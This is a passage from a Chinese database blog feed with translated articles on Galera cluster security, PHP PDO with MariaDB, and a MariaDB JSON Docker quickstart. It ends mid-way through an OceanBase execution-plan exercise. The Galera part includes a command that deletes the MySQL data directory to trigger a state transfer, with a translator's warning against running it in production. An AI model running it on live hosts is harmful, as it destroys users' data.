<p>网上有很多文章告诉您在Galera集群时禁用操作系统级防火墙，并禁用SELinux。虽然我们同意这可能是搭建Galera集群最快的方式，但它不一定有良好的安全性，我们更希望您在2022年使用更安全的Galera集群!</p>
<p>什么是SELinux？<a class="link"   href="https://www.redhat.com/en/topics/linux/what-is-selinux" >安全增强的Linux(Security-Enhanced Linux) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，允许管理员去控制谁可以对系统有更多的控制权。它有允许（permissive）模式和强制（enforcing）模式，并且在红帽企业版Linux及其衍生品中默认开启。请记住重要的一点，如果您通过我们提供的安装包来安装Galera集群，我们已经为它提供了所有必要的上下文。实际上，您不需要禁用SELinux就可以启动集群。</p>
<p>然而，当您使用 <code>rsync</code> 来做<a class="link"   href="https://galeracluster.com/library/documentation/sst-physical.html" >物理状态快照(SST) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 时，您可以进行测试来看启用SELinux是否有意义。</p>
<p>要测试它，在一个donor节点上输入：<code>setenforce 1</code>(这应该是默认值)。 然后在一个joiner节点上，触发一个SST(假设您设置它使用rsync)，通过如下命令来触发:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">service mysql stop</span><br><span class="line">rm -rf /var/lib/mysql/*</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure></div>
<p>查看<code>mysqld.log</code>(你应该总是启用错误日志; 从MySQL的角度来看，这是你第一次生成、记录登录密码的地方; 从Galera集群的角度来看，这是所有重要信息被写入的地方)，您将会看到它无法完成SST。您可以通过在donor节点上执行<code>setenforce 0</code>来快速修复。现在，更好的方法是编写SELinux上下文，或者从使用<code>rsync</code>方法切换到使用XtraBackup或新的CLONE SST方法。</p>
<p>那关于 <a class="link"   href="https://galeracluster.com/library/documentation/firewall-settings.html" >防火墙 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 呢？我们需要使用TCP的3306端口（它是MySQL的端口），TCP和UDP的4567端口（集群复制通信），TCP的4568端口用于增量状态传输（IST），以及TCP的4444用于状态快照传输（SST）。 我们有大量使用<a class="link"   href="https://galeracluster.com/library/documentation/firewalld.html" >防火墙 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和<a class="link"   href="https://galeracluster.com/library/documentation/ip-tables.html" >iptables <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的文档。值得注意的是，Galera集群在FreeBSD(和其他BSD衍生产品)上也运行得很好，所以也有关于 <a class="link"   href="https://galeracluster.com/library/documentation/firewall-pf.html" >pf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的文档。</p>
<p>如何测试防火墙是否出现问题? 在joiner节点上，执行：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --destination-port 4444 -j DROP</span><br></pre></td></tr></table></figure></div>
<p>现在，试着做一次SST，像上面那样删除数据目录。查看日志文件。修复方法很简单：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT -p tcp --destination-port 4444 -j DROP</span><br></pre></td></tr></table></figure></div>
<p>因此，我们希望今年您可以运行一个更安全的Galera集群环境。<a class="link"   href="https://galeracluster.com/galera-mgr/" >Galera Manager <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 会自动为您配置，所以您也可以考虑使用它。我们在GitHub上也有一个非常活跃的 <a class="link"   href="https://github.com/codership/galera-manager-support/issues" >支持小组 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。一定要试一试。</p>
<hr>
<blockquote>
<p>译者注：<br>
Galera Manager 可以尝试，但是，切记不要直接在生产环境测试上述步骤。</p>
</blockquote>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>galera</tag>
        <tag>译文</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 快速开发：PHP 数据对象和 MariaDB</title>
    <url>/2022/mariadb/fanyi-developer-quickstart-php-data-objects-and-mariadb/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://mariadb.com/resources/blog/developer-quickstart-php-data-objects-and-mariadb/" >https://mariadb.com/resources/blog/developer-quickstart-php-data-objects-and-mariadb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Rob Hedgpeth</p>
</blockquote>
<p><a class="link"   href="https://mariadb.com/resources/blog/developer-quickstart-php-mysqli-and-mariadb/" >上篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，我介绍了使用PHP的 <a class="link"   href="https://www.php.net/manual/en/book.mysqli.php" >MySQL增强插件–MySQLi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，来连接MariaDB数据库并与之通信的过程。最后，当你写PHP代码来连接MariaDB并与之交互时，你可能会使用两个常用选项之一：MySQLi 或者 <a class="link"   href="https://www.php.net/manual/en/book.pdo.php" >PHP数据对象（PDO） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>PDO插件旨在定义一个轻量级、一致性的接口，用在PHP访问数据库，就像MySQLi一样。实际上，PDO和MySQLi都提供了一个面向对象的API，但是MySQLi也提供了一个面向过程的API，这使得PHP新手更容易理解。</p>
<p>现在，如果您熟悉原生的PHP MySQL驱动，您可能会发现迁移到面向过程的MySQLi接口更加容易。另一方面，一旦您掌握了PDO，您可以使用它连接任何数据库，这对于从另一个数据库切换到MariaDB非常有用。</p>
<p>在这篇文章，我将深入PDO并演示如何使用它与MariaDB进行通信。 因此，让我们进入一个应用程序，了解如何使用PDO连接和查询MariaDB数据库。</p>
<img  alt="developerphpquickstart.gif" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220308-c123882f-029c-4a08-bb86-47c887731360.gif"
                      referrerpolicy="no-referrer"
                >
<p>本文中，我将重点介绍使用PDO连接MariaDB数据库并与之通信的一些基本细节。我探讨的所有内容都将基于Rolodex应用程序的代码，如果您想深入了解代码，可以查看<a class="link"   href="https://github.com/mariadb-developers/php-pdo-quickstart" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h2 id="准备数据库">准备数据库</h2>
<p>在开始编码之前，重点要注意的是这将使用一个名为<code>rolodex</code>的数据库。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE `rolodex`;</span><br></pre></td></tr></table></figure></div>
<p>数据库<code>rolodex</code>包含一张表，<code>contacts</code>，它用于存储基本信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `rolodex`.`contacts` (</span><br><span class="line">`id` <span class="type">INT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">`name` <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">`age` <span class="type">INT</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">`email` <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY  (`id`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<p>Rolodex应用运行所需的SQL可以从这个文件里找到 <a class="link"   href="https://github.com/mariadb-developers/php-pdo-quickstart/blob/main/schema.sql" >schema.sql <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="配置应用">配置应用</h2>
<p>为了方便在Rolodex PHP应用中使用MariaDB数据库，我创建了一个名为 <a class="link"   href="https://github.com/mariadb-developers/php-pdo-quickstart/blob/main/src/config.php" >config.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的新文件，它包含了配置项和数据库连接对象来在跨PHP页面中重用。PDO扩展便于与底层MariaDB数据库进行连接和通信。</p>
<p><strong>CONFIG.PHP</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=&lt;insert_host_address_here&gt;;dbname=rolodex;charset=utf8mb4&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$options</span> = [</span><br><span class="line">  PDO::<span class="variable constant_">ATTR_EMULATE_PREPARES</span>   =&gt; <span class="literal">false</span>, <span class="comment">// Disable emulation mode for &quot;real&quot; prepared statements</span></span><br><span class="line">  PDO::<span class="variable constant_">ATTR_ERRMODE</span>            =&gt; PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>, <span class="comment">// Disable errors in the form of exceptions</span></span><br><span class="line">  PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="variable constant_">FETCH_ASSOC</span>, <span class="comment">// Make the default fetch be an associative array</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&quot;&lt;insert_user_here&gt;&quot;</span>, <span class="string">&quot;&lt;insert_password_here&gt;&quot;</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">error_log</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&#x27;Something bad happened&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>在config.php文件中，我首先定义了变量，包含主机地址、用户名、密码和默认数据库等，这些变量用于创建新的 <a class="link"   href="https://www.php.net/manual/en/pdo.connections.php" >PDO连接对象 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，该对象包含各种配置项，您可以使用它来定制您的环境。</p>
<h2 id="执行SQL">执行SQL</h2>
<p>使用并重用 <code>config.php</code>中的<code>PDO</code>连接很简单，只需在另一个PHP页面中引用PHP代码库即可。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Include the database connection file</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>然后，有了已建立的连接，您就可以使用PDO扩展的多种功能，包括使用 <a class="link"   href="https://www.php.net/manual/en/pdo.query.php" >PDO::query <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 执行查询。注意，我还演示了如何将结果直接映射到一个名为 Contact 的类。</p>
<p>使用 PDO::query 查询 contants:</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Include the database connection file</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Contact</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch contacts (in descending order)</span></span><br><span class="line"><span class="variable">$contacts</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>( <span class="string">&quot;SELECT * FROM contacts ORDER BY id DESC&quot;</span>)-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_CLASS</span>, <span class="string">&#x27;Contact&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>或者，在需要处理动态插入参数值的情况下，可以使用 <a class="link"   href="https://www.php.net/manual/en/pdo.prepare.php" >PDO::prepare <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="插入数据">插入数据</h2>
<p>使用 <code>PDO::prepare</code> 插入 contacts</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO contacts (name,age,email) VALUES(?, ?, ?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$email</span>]);</span><br></pre></td></tr></table></figure></div>
<h2 id="更新数据">更新数据</h2>
<p>使用 <code>PDO::prepare</code> 更新 contacts</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;UPDATE contacts SET name = ?, age = ?, email = ? WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$email</span>, <span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure></div>
<h2 id="删除数据">删除数据</h2>
<p>使用 <code>PDO::prepare</code> 删除 contacts</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;DELETE FROM contacts WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure></div>
<p>如您所见，开始使用PDO和MariaDB很容易，但我们只触及了其表面。如果你想亲自看看PHP和MariaDB还能做些什么，可以从新的GitHub仓库 <a class="link"   href="https://github.com/mariadb-developers/php-pdo-quickstart" >PHP Data Object Quickstart <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中Rolodex应用程序的完整源码开始。</p>
<h2 id="了解更多">了解更多</h2>
<p>如果您想了解更多关于JSON和MariaDB的功能，或者关于MariaDB的许多其他特性和功能，请务必查看<a class="link"   href="https://mariadb.com/developers/" >开发者中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和我们新的<a class="link"   href="https://github.com/mariadb-developers/" >GitHub开发者代码中心组织 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。在那里您可以找到更多类似的内容，横跨了多种其他技术、用例甚至编程语言。</p>
<p>您还可以在 <a class="link"   href="https://mariadb.com/docs/" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中更深入地了解 MariaDB 功能。</p>
<p>和往常一样，感谢我们优秀的社区！如果您想参与贡献，可以在 <a class="link"   href="https://github.com/mariadb-corporation" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上找到我们，或直接发送反馈到邮箱 <a class="link"   href="mailto:developers@mariadb.com" >developers@mariadb.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，或加入新的 <a class="link"   href="https://r.mariadb.com/join-community-slack?_ga=2.102513031.72396134.1646611722-330382977.1608699423" >MariaDB社区对话(Slack) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ！</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/365458" >https://www.modb.pro/db/365458 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>译文</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 2分钟开始使用 MairaDB JSON 功能</title>
    <url>/2022/mariadb/fanyi-get-started-using-mariadb-json-capabilities-in-under-2-minutes/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://mariadb.com/resources/blog/get-started-using-mariadb-json-capabilities-in-under-2-minutes/" >https://mariadb.com/resources/blog/get-started-using-mariadb-json-capabilities-in-under-2-minutes/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Rob Hedgpeth</p>
</blockquote>
<p><a class="link"   href="https://mariadb.com/resources/blog/using-json-in-mariadb/" >上篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，我介绍如何使用MariaDB来使用 <a class="link"   href="https://www.json.org/json-en.html" >JavaScript Object Notation (JSON) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 格式数据的这一想法，这是完全免费且开箱即用的，以及为什么它如此有用。</p>
<img  alt="1.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220307-170a82b4-4baa-4d3f-aabe-241c2d332a39.webp"
                      referrerpolicy="no-referrer"
                >
<p>其要点是，将关系型数据库的传统结构化数据与半结构化JSON数据的灵活性相结合的能力，为解决现代应用程序提出的许多问题提供了一种非常有力的方法。</p>
<img  alt="2.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220307-ad43fb1f-1fd5-40e2-a4f9-7e5e20483ef4.webp"
                      referrerpolicy="no-referrer"
                >
<p>在这点上，您可能想知道，当开始使用MariaDB的JSON时，哪种方法是最简单的？别担心，我正好有您需要的！</p>
<h2 id="启动并运行MariaDB和Docker">启动并运行MariaDB和Docker</h2>
<p>和您一样，我有时想用更容易的方法去理解一些东西。这就是为什么我创建了一个 <a class="link"   href="https://github.com/mariadb-developers/mariadb-json-quickstart" >新的仓库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，可以让您在几分钟内启动并运行带有JSON功能的MariaDB。</p>
<p>通过使用 <a class="link"   href="https://www.docker.com/resources/what-container" >容器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，我们可以启动MariaDB数据库，并预加载示例JSON，允许您在几分钟内从零到可以进行查询。事实上，“MariaDB JSON快速入门”仓库只使用两个文件就完成了这一任务。</p>
<p>第一个是 <a class="link"   href="https://docs.docker.com/compose/" >Docker Compose文件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，Docker Compose文件提供了一种方法，去记录和配置所有应用的服务依赖关系，包括数据库、队列、缓存、web服务api等。 然后，使用Docker Compose命令行工具，您可以用一条命令(<code>docker-compose up</code>)为每个依赖项创建和启动一个或多个容器。</p>
<p>Compose文件包含在仓库中，命名为<code>docker-compose.yml</code>，由以下内容组成:</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">mariadb:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">mariadb:latest</span></span><br><span class="line">   <span class="attr">container_name:</span> <span class="string">mdb_json</span></span><br><span class="line">   <span class="attr">ports:</span> </span><br><span class="line">     <span class="bullet">-</span> <span class="number">3306</span><span class="string">:3306</span></span><br><span class="line">   <span class="attr">volumes:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">./data:/docker-entrypoint-initdb.d</span></span><br><span class="line">   <span class="attr">environment:</span> </span><br><span class="line">     <span class="attr">MARIADB_ROOT_PASSWORD:</span> <span class="string">&#x27;Password123!&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>如您所见，Compose文件非常简单。 首先，它将从 <a class="link"   href="https://hub.docker.com/_/mariadb" >MariaDB Docker官方镜像库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 获取最新版本的镜像，并启动一个新的Docker容器。该文件还包括暴露端口(Docker容器的内部和外部)的配置，以及为<code>root</code>用户密码。</p>
<p>您还将注意到<code>volume</code>的配置属性。 <a class="link"   href="https://docs.docker.com/storage/volumes/" >卷（Volumes） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是持久化数据生成和使用Docker容器的首选机制。</p>
<p>我使用了卷属性来靶向一个 <a class="link"   href="https://github.com/mariadb-developers/mariadb-json-quickstart/tree/main/data" >SQL脚本文件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，以创建一个新的数据库和表，并向表加载数据。</p>
<p>但是，多说无益。请您亲自使用、检出 <a class="link"   href="https://github.com/mariadb-developers/mariadb-json-quickstart" >MariaDB JSON 快速启动库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ！</p>
<h2 id="了解更多">了解更多</h2>
<p>如果您想了解更多关于JSON和MariaDB的功能，或者关于MariaDB的许多其他特性和功能，请务必查看 <a class="link"   href="https://mariadb.com/developers/" >开发者中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和我们新的 <a class="link"   href="https://github.com/mariadb-developers/" >GitHub开发者代码中心组织 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>您还可以在 <a class="link"   href="https://mariadb.com/docs/" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中更深入地了解MariaDB功能。</p>
<p>和往常一样，感谢我们优秀的社区！如果您想参与贡献，可以在 <a class="link"   href="https://github.com/mariadb-corporation" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上找到我们，或直接发送反馈到邮箱 developers@mariadb.<br>
com，或加入新的 <a class="link"   href="https://r.mariadb.com/join-community-slack?_ga=2.102513031.72396134.1646611722-330382977.1608699423" >MariaDB社区对话(Slack) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ！</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/337647" >https://www.modb.pro/db/337647 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>译文</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>【OBCP蓝宝书】 OceanBase 社区版 v3.1.2 如何查看执行计划</title>
    <url>/2022/oceanbase/ob-v3.1.2-sql-explain/</url>
    <content><![CDATA[<p>本文是OceanBase练习题的解题记录，所涉及的主要知识点：BenchmarkSQL、OB租户创建、OB执行计划，和OB SQL限流。</p>
<img  alt="ob-bmsql-word-art.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220305-fe90cc9f-08df-4b1e-b4d1-6f8518ff6106.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="练习目的">练习目的</h2>
<p>本次练习目的掌握 OceanBase 的执行计划查看方法，包括 explain 命令和查看实际执行计划。</p>
<h2 id="练习条件">练习条件</h2>
<blockquote>
<p>CentOS 7.9<br>
VM: 8c16g<br>
OB CE v3.1.2 单副本集群<br>
JDK 1.8</p>
</blockquote>
<h2 id="环境准备">环境准备</h2>
<h3 id="启动集群">启动集群</h3>
<p>OB搭建集群方法，可参考我之前的文章：<br>
<a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">【OBCP蓝宝书】 基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</a></p>
<p>启动集群:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd cluster start obce</span><br></pre></td></tr></table></figure></div>
<p>OB运行状态：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">obd cluster list</span></span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">|                   Cluster List                         |</span><br><span class="line">+------+-------------------------------+-----------------+</span><br><span class="line">| Name | Configuration Path            | Status (Cached) |</span><br><span class="line">+------+-------------------------------+-----------------+</span><br><span class="line">| obce | /home/admin/.obd/cluster/obce | running         |</span><br><span class="line">+------+-------------------------------+-----------------+</span><br></pre></td></tr></table></figure></div>
<p>修改OB资源分配，以满足基本测试需求：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd cluster edit-config obce</span><br></pre></td></tr></table></figure></div>
<p>–&gt; 配置如下：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">oceanbase-ce:</span></span><br><span class="line">  <span class="attr">servers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.36</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">    <span class="attr">home_path:</span> <span class="string">/data/ob/ob_local_data</span></span><br><span class="line">    <span class="attr">datafile_size:</span> <span class="string">15G</span></span><br><span class="line">    <span class="attr">memory_limit:</span> <span class="string">10G</span></span><br><span class="line">    <span class="attr">system_memory:</span> <span class="string">2G</span></span><br><span class="line">    <span class="attr">cpu_count:</span> <span class="number">8</span></span><br></pre></td></tr></table></figure></div>
<p>–&gt; 重载配置：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd cluster reload obce</span><br></pre></td></tr></table></figure></div>
<p>–&gt; 重载配置后，查看当前OB资源分配情况：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [(<span class="keyword">none</span>)] <span class="number">13</span>:<span class="number">47</span>:<span class="number">05</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> a.zone, CONCAT(a.svr_ip,<span class="string">&#x27;:&#x27;</span>,a.svr_port) observer,  </span><br><span class="line">cpu_total, cpu_assigned, (cpu_total<span class="operator">-</span>cpu_assigned) cpu_free,  </span><br><span class="line">mem_total<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span> mem_total_gb, mem_assigned<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span> mem_assigned_gb, </span><br><span class="line">(mem_total<span class="operator">-</span>mem_assigned)<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span> mem_free_gb, </span><br><span class="line">disk_total<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span> disk_total_gb, disk_assigned<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span> disk_assigned_gb,  </span><br><span class="line">(disk_total<span class="operator">-</span>disk_assigned)<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span> disk_free_gb  </span><br><span class="line"><span class="keyword">FROM</span> oceanbase.__all_virtual_server_stat a </span><br><span class="line"><span class="keyword">JOIN</span> oceanbase.__all_server b </span><br><span class="line"><span class="keyword">ON</span> (a.svr_ip<span class="operator">=</span>b.svr_ip <span class="keyword">AND</span> a.svr_port<span class="operator">=</span>b.svr_port) </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> a.zone, a.svr_ip;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------------------+-----------+--------------+----------+----------------+-----------------+----------------+-----------------+------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> zone  <span class="operator">|</span> observer          <span class="operator">|</span> cpu_total <span class="operator">|</span> cpu_assigned <span class="operator">|</span> cpu_free <span class="operator">|</span> mem_total_gb   <span class="operator">|</span> mem_assigned_gb <span class="operator">|</span> mem_free_gb    <span class="operator">|</span> disk_total_gb   <span class="operator">|</span> disk_assigned_gb <span class="operator">|</span> disk_free_gb   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------------------+-----------+--------------+----------+----------------+-----------------+----------------+-----------------+------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> zone1 <span class="operator">|</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.36</span>:<span class="number">2882</span> <span class="operator">|</span>         <span class="number">4</span> <span class="operator">|</span>          <span class="number">2.5</span> <span class="operator">|</span>      <span class="number">1.5</span> <span class="operator">|</span> <span class="number">8.000000000000</span> <span class="operator">|</span>  <span class="number">1.250000000000</span> <span class="operator">|</span> <span class="number">6.750000000000</span> <span class="operator">|</span> <span class="number">15.000000000000</span> <span class="operator">|</span>  <span class="number">10.000000000000</span> <span class="operator">|</span> <span class="number">5.000000000000</span> <span class="operator">|</span></span><br><span class="line"><span 